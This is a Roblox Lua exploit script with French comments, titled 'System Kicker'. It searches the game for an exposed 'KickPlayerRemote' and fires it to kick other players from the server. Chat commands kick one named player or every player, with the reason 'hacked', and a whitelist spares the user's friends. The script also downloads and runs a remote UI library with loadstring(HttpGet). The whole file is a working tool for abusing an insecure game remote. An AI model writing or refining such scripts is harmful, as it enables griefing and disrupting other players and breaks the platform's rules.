--// SERVICES
local CoreGui = cloneref(game:GetService("CoreGui"))
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local UserInputService = game:GetService("UserInputService")

--// CONFIG
local SOUND_ID = "rbxassetid://139308638407157"
local lp = Players.LocalPlayer
local mouse = lp:GetMouse()
local foundRemote = nil

--// WHITELIST (Ajoute tes potes ici)
local Whitelist = {
    "Corentin_lusr", 
    -- "PseudoDuPote2", 
    -- "PseudoDuPote3",
}

-- Fonction pour vérifier si un joueur est protégé
local function isWhitelisted(player)
    if player == lp then return true end -- Toujours se protéger soi-même
    for _, name in pairs(Whitelist) do
        if string.lower(player.Name) == string.lower(name) then
            return true
        end
    end
    return false
end

--// RAYFIELD UI INITIALISATION
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
    Name = "System Kicker",
    LoadingTitle = "Initialisation...",
    LoadingSubtitle = "by che3t_2345",
    ConfigurationSaving = { Enabled = false }
})

local Tab = Window:CreateTab("Scan & Info", nil)
local StatusLabel = Tab:CreateLabel("Status : Remote non scannée")

--// NOTIFICATION (Rayfield + Son)
local function notify(title, text)
    Rayfield:Notify({
        Title = title,
        Content = text,
        Duration = 3,
        Image = nil,
    })
    
    local s = Instance.new("Sound")
    s.SoundId = SOUND_ID
    s.Parent = CoreGui
    s.Volume = 1
    s:Play()
    task.wait(2)
    s:Destroy()
end

--// LOGIQUE DE SCAN
local function scanRemote()
    foundRemote = ReplicatedStorage:FindFirstChild("KickPlayerRemote", true) 
               or Workspace:FindFirstChild("KickPlayerRemote", true)
    
    if foundRemote then
        StatusLabel:Set("Status : Remote trouvée ! ✅")
        notify("Scanner", "Remote trouvée : " .. foundRemote.Name)
    else
        StatusLabel:Set("Status : Remote introuvable... ❌")
        notify("Scanner", "Remote non détectée")
    end
end

Tab:CreateButton({
    Name = "Scanner les Remotes",
    Callback = function() scanRemote() end,
})

--// LOGIQUE KICK (Fonction unique)
local function executeKick(target)
    if not foundRemote then
        notify("Erreur", "Remote non trouvée ! Scan d'abord.")
        return
    end
    
    if isWhitelisted(target) then
        notify("Sécurité", target.Name .. " est en Whitelist !")
        return
    end
    
    foundRemote:FireServer(target, "hacked")
end

--// CLIC POUR COPIER (Ctrl + Clic Gauche)
UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
        local target = mouse.Target
        if target and target.Parent then
            local player = Players:GetPlayerFromCharacter(target.Parent)
            if player and player ~= lp then
                local command = "/kick " .. player.Name
                setclipboard(command)
                notify("Kicker", "Pseudo copié : " .. player.Name)
            end
        end
    end
end)

--// CHAT COMMAND (Instantané)
lp.Chatted:Connect(function(msg)
    local args = string.split(msg, " ")
    if args[1] == "/kick" then
        if not foundRemote then
            notify("Erreur", "Remote non trouvée")
            return
        end

        if args[2] == "all" then
            -- KICK ALL INSTANTANÉ
            for _, v in ipairs(Players:GetPlayers()) do
                if v ~= lp and not isWhitelisted(v) then
                    foundRemote:FireServer(v, "hacked")
                end
            end
            notify("System Kicker", "Kick All (Whitelist respectée) !")

        elseif args[2] then
            -- KICK CIBLÉ
            for _, v in ipairs(Players:GetPlayers()) do
                if string.find(string.lower(v.Name), string.lower(args[2])) then
                    executeKick(v)
                    if not isWhitelisted(v) then
                        notify("System Kicker", "Kick : " .. v.Name)
                    end
                end
            end
        end
    end
end)
